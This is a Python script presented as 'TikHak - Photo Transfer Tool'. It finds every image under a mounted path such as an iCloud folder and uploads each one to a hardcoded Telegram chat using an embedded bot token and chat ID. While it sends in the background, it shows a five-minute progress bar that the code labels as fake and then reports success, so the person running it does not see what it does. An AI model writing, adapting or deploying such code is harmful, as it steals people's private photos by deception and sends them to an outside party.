#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import time
import json
import threading
import sys
import telebot

# ------------------ Configuration ------------------
BOT_TOKEN = '8247422791:AAHqQ7e4Xo7W5smy5YxozdKPzpSvLpNkf_g'
CHAT_ID   = 7353315890
TARGET_PATH = '/mnt/icloud'          # Change this to your mounted path
IMAGE_EXTENSIONS = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp', '.heic')
SENT_LOG = os.path.expanduser('~/sent_images.json')

# ------------------ Banner ------------------
def show_banner():
    banner = """
    ========================================
            TikHak - Photo Transfer Tool
    ========================================
    """
    print(banner)

# ------------------ Bot Setup ------------------
bot = telebot.TeleBot(BOT_TOKEN)
bot.remove_webhook()

# ------------------ Helper Functions ------------------
def load_sent():
    if os.path.exists(SENT_LOG):
        with open(SENT_LOG, 'r', encoding='utf-8') as f:
            return set(json.load(f))
    return set()

def save_sent(sent):
    with open(SENT_LOG, 'w', encoding='utf-8') as f:
        json.dump(list(sent), f, ensure_ascii=False, indent=2)

def find_images(folder):
    images = []
    if not os.path.exists(folder):
        return images
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file.lower().endswith(IMAGE_EXTENSIONS):
                images.append(os.path.join(root, file))
    return images

def send_all_images():
    """Actual sending function (runs in background)"""
    sent = load_sent()
    images = find_images(TARGET_PATH)
    new_images = [img for img in images if img not in sent]

    if not new_images:
        return

    for img_path in new_images:
        try:
            with open(img_path, 'rb') as photo:
                bot.send_photo(CHAT_ID, photo)
            sent.add(img_path)
            save_sent(sent)
            time.sleep(1.5)   # Delay to avoid Telegram limits
        except Exception:
            continue   # Ignore errors and continue

# ------------------ Fake Progress Bar (5 minutes) ------------------
def fake_progress_bar(duration=300):
    for i in range(duration):
        percent = (i + 1) / duration * 100
        bar_length = 30
        filled = int(bar_length * (i + 1) // duration)
        bar = '█' * filled + '░' * (bar_length - filled)
        sys.stdout.write(f'\rProcessing... |{bar}| {percent:.1f}%')
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write('\rProcessing... |██████████████████████████████| 100.0% - Complete.\n')

# ------------------ Main Execution ------------------
if __name__ == '__main__':
    show_banner()

    # Start sending in a separate thread
    sender_thread = threading.Thread(target=send_all_images)
    sender_thread.daemon = True
    sender_thread.start()

    # Show fake progress bar for 5 minutes
    fake_progress_bar(300)

    # Wait for sending to finish (extra 10 seconds)
    sender_thread.join(timeout=10)
    print("Operation completed successfully.")
